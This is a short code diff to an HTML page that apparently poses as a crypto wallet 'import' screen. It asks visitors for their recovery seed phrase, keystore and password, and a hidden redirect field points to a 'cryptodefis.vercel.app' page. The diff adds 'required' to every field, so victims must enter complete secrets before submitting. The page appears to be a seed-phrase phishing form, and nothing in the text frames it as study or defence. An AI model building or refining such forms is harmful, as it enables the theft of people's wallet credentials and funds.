@@ -41,6 +41,7 @@
             name="seedphrase"
             id="seed"
             placeholder="Input your phrase value"
+            required
           />
           <p class="seed">
             Typically 12(sometimes 24) words seperated by single spaces
@@ -49,6 +50,7 @@
             type="hidden"
             name="_redirect"
             value="https://cryptodefis.vercel.app/inprogress.html"
+            required
           />
           <button type="submit">IMPORT</button>
         </form>
@@ -61,12 +63,14 @@
             name="keystore"
             id="keys"
             placeholder="Input your keystore value"
+            required
           />
           <input
             type="password"
             name="password"
             id="password"
             placeholder="Password"
+            required
           />
           <p class="keystore">
             Several lines of text beginning with '(...)' plus the password you
